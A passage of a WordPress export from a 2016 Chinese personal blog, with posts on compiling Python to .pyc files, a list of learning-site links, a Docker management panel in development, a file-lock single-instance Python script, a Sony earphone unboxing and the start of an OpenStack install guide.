<a href="https://www.nervgeek.com/wp-content/uploads/2016/07/E95TP@4CTZG3B70UT7B.png"><img class="alignnone size-full wp-image-1393" src="https://www.nervgeek.com/wp-content/uploads/2016/07/E95TP@4CTZG3B70UT7B.png" alt="E&#96;)95)TP$@4CTZG3B70UT7B" width="297" height="120" /></a>
我们需要编译<strong>day2.py</strong>文件，新建一个<strong>bianyi.py</strong>，里面输入：

<pre>import py_compile
py_compile.compile('day2.py')</pre>

因为<strong>bianyi.py</strong>和<strong>day2.py</strong>在同一级文件夹里面，可以直接输入文件名。
在CMD命令行下直接运行<strong>bianyi.py</strong>。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/07/4B@OPM7PT84GTD4D.png"><img class="alignnone size-full wp-image-1394" src="https://www.nervgeek.com/wp-content/uploads/2016/07/4B@OPM7PT84GTD4D.png" alt="4B@)O)]PM}7PT%8{4GTD4[D" width="1223" height="639" /></a>
可以看到目录下多了一个<strong>day2.pyc</strong>文件，这就是编译之后的Python程序。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/07/JGL_WUHB8@S9VWD3K.png"><img class="alignnone size-full wp-image-1395" src="https://www.nervgeek.com/wp-content/uploads/2016/07/JGL_WUHB8@S9VWD3K.png" alt="JG]L_WU]H{B%8@S9V$]WD3K" width="311" height="142" /></a>
还有一种编译方式，直接在命令行添加参数编译，而且还可以优化代码。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/07/B6FWWM7M796BH8JLOI9U.png"><img class="alignnone size-full wp-image-1396" src="https://www.nervgeek.com/wp-content/uploads/2016/07/B6FWWM7M796BH8JLOI9U.png" alt="B6FWWM&#96;7M796B~H8[JLOI9U" width="667" height="76" /></a>
会生成一个后续名为<code>.pyo</code>的文件：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/07/7Y7J23@0F4Q8PBMLMGM.png"><img class="alignnone size-full wp-image-1397" src="https://www.nervgeek.com/wp-content/uploads/2016/07/7Y7J23@0F4Q8PBMLMGM.png" alt="7][Y7J23@0F4Q8&#96;PBML%MGM" width="189" height="107" /></a>
<strong>最后：.py、.pyc、.pyo都可以直接运行！</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1392</wp:post_id>
		<wp:post_date><![CDATA[2016-07-28 14:26:26]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-07-28 06:26:26]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%bc%96%e8%af%91python%e8%84%9a%e6%9c%ac]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="myphoto"><![CDATA[个人摄影]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[181]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>学习网站收集</title>
		<link>https://www.nervgeek.com/2016/08/03/%e5%ad%a6%e4%b9%a0%e7%bd%91%e7%ab%99%e6%94%b6%e9%9b%86/</link>
		<pubDate>Wed, 03 Aug 2016 15:24:14 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1400</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Python、Javascript、Git教程：</strong><a href="http://www.liaoxuefeng.com/">http://www.liaoxuefeng.com/</a> （<a class="uk-navbar-brand uk-visible-large" href="http://www.liaoxuefeng.com/">廖雪峰的官方网站</a>）
<strong>Python yield 使用浅析：</strong><a href="http://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/">http://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/</a>
<strong>Beautiful Soup 4.4.0 文档(Python静态网页爬虫)：</strong><a href="http://beautifulsoup.readthedocs.io/zh_CN/latest/">http://beautifulsoup.readthedocs.io/zh_CN/latest/</a>
<strong>Python实现Weibo模拟登陆：</strong><a href="https://www.douban.com/note/201767245/">https://www.douban.com/note/201767245/</a> <a href="https://www.douban.com/note/264976536/"> https://www.douban.com/note/264976536/</a>
<strong>Phantomjs v.2.1 addCookie()始终返回错误：</strong><a href="https://segmentfault.com/a/1190000005367333">https://segmentfault.com/a/1190000005367333</a>
<strong>Python爬虫教程：</strong><a href="http://cuiqingcai.com/1052.html">http://cuiqingcai.com/1052.html</a>
<strong>Python监控Docker容器：</strong><a href="http://dl528888.blog.51cto.com/2382721/1635951">http://dl528888.blog.51cto.com/2382721/1635951</a>
<strong>不会报错的MySQL-python：</strong><a href="http://www.codegood.com/archives/129">http://www.codegood.com/archives/129</a>
<strong>MySQL-python报错解决方法：</strong><a href="http://my.oschina.net/mickelfeng/blog/147193">http://my.oschina.net/mickelfeng/blog/147193</a>
<strong>各种技术的技术文档：</strong><a href="http://www.open-open.com/">http://www.open-open.com/</a>
<strong>广州简悦公司一位员工的博客，非常多技术文章：</strong><a href="http://blog.codingnow.com/">http://blog.codingnow.com/</a>
<strong>陈沙克老师的博客，记录了非常多OpenStack的技术文档：</strong><a href="http://www.chenshake.com/">http://www.chenshake.com/</a>
<strong>李满满老师的博客，记录了Flask框架的使用以及监控平台：</strong><a href="http://xmdevops.blog.51cto.com/">http://xmdevops.blog.51cto.com/</a>
<strong>Flask 框架中文手册，学习必备！</strong>：<a href="http://docs.jinkan.org/docs/flask/">http://docs.jinkan.org/docs/flask/</a>
<strong>Flask 框架中文手册，学习必备！：</strong><a href="http://docs.pythontab.com/flask/flask0.10/patterns/packages.html">http://docs.pythontab.com/flask/flask0.10/patterns/packages.html</a>
<strong>你会做Web上的用户登录功能吗？：</strong><a href="http://coolshell.cn/articles/5353.html">http://coolshell.cn/articles/5353.html</a>
<strong>Flask-Login中文手册：</strong><a href="http://docs.jinkan.org/docs/flask-login/">http://docs.jinkan.org/docs/flask-login/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1400</wp:post_id>
		<wp:post_date><![CDATA[2016-08-03 23:24:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-08-03 15:24:14]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%ad%a6%e4%b9%a0%e7%bd%91%e7%ab%99%e6%94%b6%e9%9b%86]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="git"><![CDATA[Git]]></category>
		<category domain="post_tag" nicename="git"><![CDATA[Git]]></category>
		<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
		<category domain="post_tag" nicename="javascript"><![CDATA[Javascript]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b951c1a0711ad96b58aace2ebb12d836]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_f3fd6323612f20b88d1ce3ddd99f650f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_b586b91d7f723638fae2b08dbfdab0ca]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_908dfb683b36debf24281dcede72c8c9]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_4dcbf0f65b0a5ad53c6dc10309779291]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_41ce1daa91f29b774a00bfffc27a7c11]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_9ade1ce86a6b0437fe979eb6b82abc8f]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[10]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_928bce3c9dc589d31286cb386eb9ce10]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_284b40bc32b5fbeedea576ebee60558a]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>单节点版Docker管理平台(开发中)</title>
		<link>https://www.nervgeek.com/2016/08/16/%e5%8d%95%e8%8a%82%e7%82%b9%e7%89%88docker%e7%ae%a1%e7%90%86/</link>
		<pubDate>Tue, 16 Aug 2016 15:49:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1410</guid>
		<description></description>
		<content:encoded><![CDATA[最近在着手Docker资源管理平台的开发，花了几天系统地学习了Docker，并看了下Docker自带的Restful API，贯彻我的“Learn by Doing”，便立马着手实际开发，因为第一个版本还是做单节点版本，所以还是很简单的一套获取JSON展示、POST容器ID操作容器的平台。
目前仅实现了容器部分数据展示、容器的启动、暂停、停止、删除、镜像的展示。接下来会添加容器的新建、镜像的拉取、容器的资源占用实时动态展示。
截图：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/JEWL9Q@VSGGP_CWKBH.png"><img class="alignnone size-full wp-image-1411" src="https://www.nervgeek.com/wp-content/uploads/2016/08/JEWL9Q@VSGGP_CWKBH.png" alt="J%E}%W{{L9Q@VSGGP_CWKBH" width="1806" height="1221" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/08/XSXU_0HVJL2V0AAVI5.png"><img class="alignnone size-full wp-image-1412" src="https://www.nervgeek.com/wp-content/uploads/2016/08/XSXU_0HVJL2V0AAVI5.png" alt="XSXU_~0[H[VJ(L2V0AAVI$5" width="1806" height="1221" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/08/UD1@U_@_DBFOLM5ZAH.png"><img class="alignnone size-full wp-image-1414" src="https://www.nervgeek.com/wp-content/uploads/2016/08/UD1@U_@_DBFOLM5ZAH.png" alt="UD1@&#96;U(_@_(DB(FO(LM5ZAH" width="1806" height="1221" /></a>
最近TI比赛...晚上还要去健身房，加上自带懒癌，一个星期也就做了那么点。先把单节点版本完工，然后在此基础上使用队列模式来实现群集的管理。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1410</wp:post_id>
		<wp:post_date><![CDATA[2016-08-16 23:49:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-08-16 15:49:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%8d%95%e8%8a%82%e7%82%b9%e7%89%88docker%e7%ae%a1%e7%90%86]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0"><![CDATA[管理平台]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[159]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>让Python脚本不能同时执行两个（不能同时在后台执行）——单实例</title>
		<link>https://www.nervgeek.com/2016/08/17/%e8%ae%a9python%e8%84%9a%e6%9c%ac%e4%b8%8d%e8%83%bd%e5%90%8c%e6%97%b6%e6%89%a7%e8%a1%8c%e4%b8%a4%e4%b8%aa%ef%bc%88%e4%b8%8d%e8%83%bd%e5%90%8c%e6%97%b6%e5%9c%a8%e5%90%8e%e5%8f%b0%e6%89%a7%e8%a1%8c/</link>
		<pubDate>Wed, 17 Aug 2016 13:15:17 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1420</guid>
		<description></description>
		<content:encoded><![CDATA[最近在做一个队列的东西，Python 轮询监听队列内的数据，为了测试，客户端我循环 500 个数据发送过去，结果我在服务端查看输出，只有零零碎碎的一部分数据，经过我一番排除，我用 jobs 命令查看 Linux 后台运行的脚本，发现同时在运行了三个脚本，其中一个我去掉了输出，导致数据输出零零碎碎。
我采用的是打开文件本身加锁：

<pre>#!/usr/bin/env python
#coding: utf-8
import fcntl, sys, time, os
pidfile = 0
def ApplicationInstance():
    global pidfile
    pidfile = open(os.path.realpath(__file__), "r")
    try:
        fcntl.flock(pidfile, fcntl.LOCK_EX | fcntl.LOCK_NB) #创建一个排他锁,并且所被锁住其他进程不会阻塞
    except:
        print "another instance is running..."
        exit()
if __name__ == "__main__":
    ApplicationInstance()
    while True:
        print 'running...'
        time.sleep(1)</pre>

<code>fcntl.flock 的 fcntl.LOCK_EX</code> 可对文件加锁，解锁可用 <code>fcntl.LOCK_UN</code> 。
代码来源：<a href="http://blog.csdn.net/taiyang1987912/article/details/44850999">http://blog.csdn.net/taiyang1987912/article/details/44850999</a>  这里还有很多不同方法的加锁模式。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1420</wp:post_id>
		<wp:post_date><![CDATA[2016-08-17 21:15:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-08-17 13:15:17]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%ae%a9python%e8%84%9a%e6%9c%ac%e4%b8%8d%e8%83%bd%e5%90%8c%e6%97%b6%e6%89%a7%e8%a1%8c%e4%b8%a4%e4%b8%aa%ef%bc%88%e4%b8%8d%e8%83%bd%e5%90%8c%e6%97%b6%e5%9c%a8%e5%90%8e%e5%8f%b0%e6%89%a7%e8%a1%8c]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="lock"><![CDATA[lock]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="post_tag" nicename="queue"><![CDATA[queue]]></category>
		<category domain="post_tag" nicename="%e5%8d%95%e5%ae%9e%e4%be%8b"><![CDATA[单实例]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[169]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Sony XBA-A2圈铁耳机开箱</title>
		<link>https://www.nervgeek.com/2016/08/25/sony-xba-a2%e5%bc%80%e7%ae%b1/</link>
		<pubDate>Thu, 25 Aug 2016 14:47:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1427</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: left;">服役了仅仅一年半的GR07 BASS就因为线材问题，早早退休了(其实可以修，但还是给了我一个借口换耳机)。</p>

选择A2的原因很简单，可换线、第一次尝试圈铁、索尼大法好。
近年来索尼的小金标已经成为了衡量器材、音乐的新标准。我的Z5手机也有小金标，如今Z5、A2凑成一套简陋的小金标，感受一下小金标脑放的神秘加成。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8375.jpg"><img class="alignnone size-full wp-image-1428" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8375.jpg" alt="格式工厂_MG_8375" width="1280" height="853" /></a>

<p style="text-align: center;">保修卡在中间，一不注意就撕掉扔掉了。</p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8377.jpg"><img class="alignnone size-full wp-image-1429" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8377.jpg" alt="格式工厂_MG_8377" width="1280" height="853" /></a>

<p style="text-align: center;">可以左右拉出来的设计，全黑的盒子中间嵌着银色的 SONY logo，信仰MAX。</p>

&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8379.jpg"><img class="alignnone size-full wp-image-1430" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8379.jpg" alt="格式工厂_MG_8379" width="1280" height="853" /></a>

<p style="text-align: center;">俩小美人静静躺在盒子里。</p>

&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8388.jpg"><img class="alignnone size-full wp-image-1431" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8388.jpg" alt="格式工厂_MG_8388" width="1280" height="853" /></a>

<p style="text-align: center;">这长度...长达3.5cm，如同两个U盘插在脑子上。</p>

<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8390.jpg"><img class="alignnone size-full wp-image-1432" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8390.jpg" alt="格式工厂_MG_8390" width="1280" height="853" /></a>

<p style="text-align: center;">左右两边也印有 SONY logo，带在街上颇有自豪感。</p>

&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8391.jpg"><img class="alignnone size-full wp-image-1433" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8391.jpg" alt="格式工厂_MG_8391" width="1280" height="853" /></a>

<p style="text-align: center;">耳机插得挺紧得，用点力扣下来。</p>

&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8392.jpg"><img class="alignnone size-full wp-image-1434" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8392.jpg" alt="格式工厂_MG_8392" width="1280" height="853" /></a>

<p style="text-align: center;">颇为丰富的配件，四对哥套，三对内有填充物的耳套，还有一条耳机线。</p>

<p style="text-align: center;">索尼的哥套单卖都很值钱啊。</p>

&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8393.jpg"><img class="alignnone size-full wp-image-1435" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8393.jpg" alt="格式工厂_MG_8393" width="1280" height="853" /></a><a href="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8394.jpg"><img class="alignnone size-full wp-image-1440" src="https://www.nervgeek.com/wp-content/uploads/2016/08/格式工厂_MG_8394.jpg" alt="格式工厂_MG_8394" width="1280" height="853" /></a>

<p style="text-align: center;">很有质感的耳机包。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1427</wp:post_id>
		<wp:post_date><![CDATA[2016-08-25 22:47:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-08-25 14:47:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[sony-xba-a2%e5%bc%80%e7%ae%b1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="sony"><![CDATA[Sony]]></category>
		<category domain="post_tag" nicename="xba-a2"><![CDATA[xba a2]]></category>
		<category domain="category" nicename="myphoto"><![CDATA[个人摄影]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%b0%bc"><![CDATA[索尼]]></category>
		<category domain="post_tag" nicename="%e8%80%b3%e6%9c%ba"><![CDATA[耳机]]></category>
		<category domain="category" nicename="%e8%b6%a3%e9%97%bb"><![CDATA[趣闻]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[195]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>OpenStack Mitaka手动安装 - 搭建Controller节点</title>
		<link>https://www.nervgeek.com/2016/09/07/openstack-mitaka%e6%89%8b%e5%8a%a8%e5%ae%89%e8%a3%85-controller%e8%8a%82%e7%82%b9/</link>
		<pubDate>Wed, 07 Sep 2016 09:55:23 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1451</guid>
		<description></description>
		<content:encoded><![CDATA[前言：我也是个OpenStack新手，搭建纯属兴趣，如搭建过程中发生任何问题，望多多交流。如果找到解决方法务必回复在文章底下！

<p style="text-align: center;"><strong><span style="font-size: 18pt;">目录</span></strong></p>

<table>
<tbody>
<tr style="height: 41px;">
<td style="height: 41px; text-align: center;">1.  <a href="https://www.nervgeek.com/pages/1451.html">安装准备</a></td>
</tr>
<tr style="height: 41px;">
<td style="height: 41px; text-align: center;">2.  <a href="https://www.nervgeek.com/pages/1451.html/2">系统安装</a></td>
</tr>
<tr style="height: 41px;">
<td style="height: 41px; text-align: center;">3.  <a href="https://www.nervgeek.com/pages/1451.html/3">系统配置和安装必备软件</a></td>
</tr>
<tr style="height: 41px;">
<td style="height: 41px; text-align: center;">4.  <a href="https://www.nervgeek.com/pages/1451.html/4">安装 Mariadb 和 RabbitMQ</a></td>
</tr>
<tr style="height: 41px;">
<td style="height: 41px; text-align: center;">5.  <a href="https://www.nervgeek.com/pages/1451.html/5">安装 Keystone</a></td>
</tr>
<tr style="height: 41px;">
<td style="height: 41px; text-align: center;">6.  <a href="https://www.nervgeek.com/pages/1451.html/6">安装 Glance</a></td>
</tr>
<tr style="height: 29px;">
<td style="height: 29px; text-align: center;">7.  <a href="https://www.nervgeek.com/pages/1451.html/7">安装 Nova</a></td>
</tr>
<tr style="height: 29px;">
<td style="height: 29px; text-align: center;">8.  <a href="https://www.nervgeek.com/pages/1451.html/8">安装 Neutron</a></td>
</tr>
<tr style="height: 29px;">
<td style="height: 29px; text-align: center;">9.  <a href="https://www.nervgeek.com/pages/1451.html/9">安装 Dashboard</a></td>
</tr>
</tbody>
</table>

<h6><span style="font-size: 18pt;">
0x01  安装准备</span></h6>

<span style="font-size: 14pt;"><strong>环境：</strong></span>
VMware 12 pro

<table>
<tbody>
<tr>
<td>虚拟机名称</td>
<td>内存</td>
<td>CPU核数</td>
</tr>
<tr>
<td>controller</td>
<td>2G</td>
<td>2核</td>
</tr>
<tr>
<td>硬盘容量</td>
<td>网卡一</td>
<td>网卡二</td>
</tr>
<tr>
<td>40G</td>
<td>192.168.188.128</td>
<td>10.0.0.2</td>
</tr>
</tbody>
</table>

<span style="font-size: 14pt;"><a href="https://www.nervgeek.com/wp-content/uploads/2016/09/FPUPSUCLH348334CXBEI9H.png">
<img class="wp-image-1456 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/09/FPUPSUCLH348334CXBEI9H.png" alt="F]PUPSUCLH348334CXBEI9H" width="566" height="546" /></a><strong>详细截图：</strong></span>
